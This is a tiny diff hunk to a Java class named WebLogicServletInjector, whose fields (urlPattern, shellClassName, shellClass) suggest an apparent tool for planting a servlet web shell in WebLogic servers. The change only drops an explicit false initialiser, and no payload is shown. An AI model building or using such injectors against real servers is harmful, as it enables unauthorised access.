@@ -22,7 +22,7 @@ public class WebLogicServletInjector {
     private static String urlPattern;
     private static String shellClassName;
     private static String shellClass;
-    private static boolean ok = false;
+    private static boolean ok;
 
     public WebLogicServletInjector() {
         if (ok) {
